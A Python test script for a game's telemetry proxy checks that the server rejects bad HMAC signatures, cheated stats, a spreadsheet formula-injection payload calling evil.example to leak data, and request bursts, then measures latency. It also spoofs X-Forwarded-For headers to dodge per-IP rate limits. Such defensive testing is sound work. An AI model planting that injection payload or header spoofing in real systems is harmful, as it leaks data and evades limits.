"""
Script Minh chứng Bảo mật (Phần A) & Đo thực tế độ trễ NFR-05 (Phần B) cho Death Relapse (v0.9).

Cách chạy:
  python telemetry-service/scripts/attack_demo_and_p95.py --url http://127.0.0.1:8080 --secret change-me-local-secret
"""

from __future__ import annotations

import argparse
import json
import os
import statistics
import sys
import time
from pathlib import Path

import httpx

SERVICE_ROOT = Path(__file__).resolve().parents[1]
if str(SERVICE_ROOT) not in sys.path:
    sys.path.insert(0, str(SERVICE_ROOT))

from app.security import CLIENT_VERSION, create_signed_envelope_json


def build_sample_payload(**overrides) -> dict:
    payload = {
        "timestamp": "26/11/2026 - 12h45p00s",
        "sessionId": "demo0001",
        "experimentGroup": "GroupB_WithTelegraph",
        "matchResult": "Defeat",
        "elapsedSeconds": 45.2,
        "playerHP": 0.0,
        "bossHP": 1350.0,
        "totalBossAttacks": 7,
        "totalHitsTaken": 3,
        "totalDodgedIFrame": 2,
        "attackBreakdown": "RedAttack(T:4,H:2,D:1,M:1);StrongRedAttack(T:3,H:1,D:1,M:1)",
        "surveyAnswer": "PlayerSkill_Timing",
    }
    payload.update(overrides)
    return payload


def make_signed_request(payload: dict, secret: str, ts_unix: int | None = None) -> tuple[bytes, dict[str, str]]:
    ts = int(time.time()) if ts_unix is None else ts_unix
    raw_json = json.dumps(payload, ensure_ascii=False, separators=(",", ":"))
    signed_json, sig = create_signed_envelope_json(raw_json, ts, secret)
    headers = {
        "Content-Type": "application/json",
        "X-DR-Signature": sig,
        "X-DR-Timestamp": str(ts),
        "X-DR-Client-Version": CLIENT_VERSION,
    }
    return signed_json.encode("utf-8"), headers


def percentile(sorted_values: list[float], p: float) -> float:
    if not sorted_values:
        return 0.0
    if len(sorted_values) == 1:
        return sorted_values[0]
    k = (len(sorted_values) - 1) * (p / 100.0)
    low = int(k)
    high = min(low + 1, len(sorted_values) - 1)
    frac = k - low
    return sorted_values[low] + (sorted_values[high] - sorted_values[low]) * frac


def run_security_demo(base_url: str, secret: str, rate_burst: int) -> list[tuple[str, int, int, str]]:
    endpoint = f"{base_url.rstrip('/')}/api/telemetry"
    results: list[tuple[str, int, int, str]] = []

    with httpx.Client(timeout=8.0) as client:
        # 1. Payload hợp lệ có HMAC -> 200 OK
        body1, headers1 = make_signed_request(build_sample_payload(sessionId="demo_ok1"), secret)
        headers1["X-Forwarded-For"] = "10.0.0.1"
        r1 = client.post(endpoint, content=body1, headers=headers1)
        results.append(("1. Hợp lệ (HMAC-SHA256 đúng)", 200, r1.status_code, r1.json().get("status", "")))

        # 2. Payload sai/thiếu HMAC -> 401 Unauthorized
        body2, headers2 = make_signed_request(build_sample_payload(sessionId="demo_401"), "wrong-secret-key")
        headers2["X-Forwarded-For"] = "10.0.0.2"
        r2 = client.post(endpoint, content=body2, headers=headers2)
        results.append(("2. Sai chữ ký HMAC", 401, r2.status_code, r2.json().get("code", "")))

        # 3. Payload gian lận bất biến T != H + D + M -> 400 Bad Request
        bad_inv = build_sample_payload(
            sessionId="demo_inv",
            totalBossAttacks=5,
            totalHitsTaken=4,
            totalDodgedIFrame=3,
            attackBreakdown="RedAttack(T:5,H:4,D:3,M:0)",
        )
        body3, headers3 = make_signed_request(bad_inv, secret)
        headers3["X-Forwarded-For"] = "10.0.0.3"
        r3 = client.post(endpoint, content=body3, headers=headers3)
        results.append(("3. Gian lận T != H + D + M", 400, r3.status_code, r3.json().get("code", "")))

        # 4. Payload chứa Formula Injection =IMPORTXML(...) -> 400 Bad Request
        evil_formula = build_sample_payload(
            sessionId="demo_inj",
            attackBreakdown='=IMPORTXML("http://evil.example/leak","//a")',
        )
        body4, headers4 = make_signed_request(evil_formula, secret)
        headers4["X-Forwarded-For"] = "10.0.0.4"
        r4 = client.post(endpoint, content=body4, headers=headers4)
        results.append(("4. Formula Injection (=IMPORTXML)", 400, r4.status_code, r4.json().get("code", "")))

        # 5. Bắn liên tiếp từ cùng 1 IP để kích hoạt Rate Limit -> 429 Too Many Requests
        got_429_code = 0
        got_429_reason = "NotTriggered"
        for i in range(rate_burst):
            body5, headers5 = make_signed_request(build_sample_payload(sessionId=f"demo_rl{i}"), secret)
            headers5["X-Forwarded-For"] = "10.0.0.99"
            r5 = client.post(endpoint, content=body5, headers=headers5)
            got_429_code = r5.status_code
            got_429_reason = r5.json().get("code", r5.json().get("status", ""))
            if r5.status_code == 429:
                break
        results.append((f"5. Vượt Rate Limit ({rate_burst} req)", 429, got_429_code, got_429_reason))

    return results


def run_nfr05_latency(base_url: str, secret: str, sample_count: int) -> list[float]:
    endpoint = f"{base_url.rstrip('/')}/api/telemetry"
    latencies_ms: list[float] = []

    with httpx.Client(timeout=8.0) as client:
        for i in range(sample_count):
            body, headers = make_signed_request(build_sample_payload(sessionId=f"nfr05_{i:02d}"), secret)
            # Mỗi mẫu dùng 1 IP mô phỏng khác nhau (10.1.0.x) để đo độ trễ sạch không dính Rate Limit 10/phút
            headers["X-Forwarded-For"] = f"10.1.0.{i + 1}"
            t0 = time.perf_counter()
            resp = client.post(endpoint, content=body, headers=headers)
            elapsed_ms = (time.perf_counter() - t0) * 1000.0
            if resp.status_code != 200:
                raise RuntimeError(
                    f"Request NFR-05 #{i + 1} thất bại (HTTP {resp.status_code}): {resp.text}"
                )
            latencies_ms.append(elapsed_ms)

    return latencies_ms


def main() -> int:
    parser = argparse.ArgumentParser(description="Demo bảo mật API & đo NFR-05 cho Death Relapse Telemetry Proxy")
    parser.add_argument("--url", default=os.getenv("DR_PROXY_URL", "http://127.0.0.1:8080"), help="URL gốc của proxy")
    parser.add_argument("--secret", default=os.getenv("HMAC_SECRET", "change-me-local-secret"), help="Khóa HMAC_SECRET")
    parser.add_argument("--rate-burst", type=int, default=15, help="Số request bắn liên tiếp để kích hoạt 429")
    parser.add_argument("--nfr-samples", type=int, default=20, help="Số request hợp lệ đo NFR-05")
    args = parser.parse_args()

    print("=" * 78)
    print("  DEATH RELAPSE (v0.9) - MINH CHỨNG BẢO MẬT API & ĐO ĐỘ TRỄ NFR-05")
    print(f"  Target: {args.url}")
    print("=" * 78)

    with httpx.Client(timeout=5.0) as client:
        health = client.get(f"{args.url.rstrip('/')}/health")
        print(f"[HEALTH] HTTP {health.status_code} -> {health.text}")

    print("\n--- PHẦN A: KỊCH BẢN MINH CHỨNG CHẶN TẤN CÔNG ---")
    print(f"{'Kịch bản':<36} | {'Kỳ vọng':<7} | {'Thực tế':<7} | {'Mã / Trạng thái':<24} | Kết quả")
    print("-" * 92)
    demo_results = run_security_demo(args.url, args.secret, args.rate_burst)
    all_ok = True
    for name, expected, actual, code in demo_results:
        passed = expected == actual
        if not passed:
            all_ok = False
        mark = "PASS" if passed else "FAIL"
        print(f"{name:<36} | {expected:<7} | {actual:<7} | {code:<24} | {mark}")

    print(f"\n--- PHẦN B: ĐO THỰC TẾ NFR-05 ({args.nfr_samples} REQUEST HỢP LỆ) ---")
    latencies = run_nfr05_latency(args.url, args.secret, args.nfr_samples)
    sorted_lat = sorted(latencies)
    avg_ms = statistics.mean(sorted_lat)
    p50_ms = percentile(sorted_lat, 50)
    p95_ms = percentile(sorted_lat, 95)
    max_ms = max(sorted_lat)

    print(f"  Samples : {len(sorted_lat)} (100% HTTP 200 OK)")
    print(f"  Avg     : {avg_ms:.2f} ms")
    print(f"  p50     : {p50_ms:.2f} ms")
    print(f"  p95     : {p95_ms:.2f} ms")
    print(f"  Max     : {max_ms:.2f} ms")
    print("=" * 78)

    return 0 if all_ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
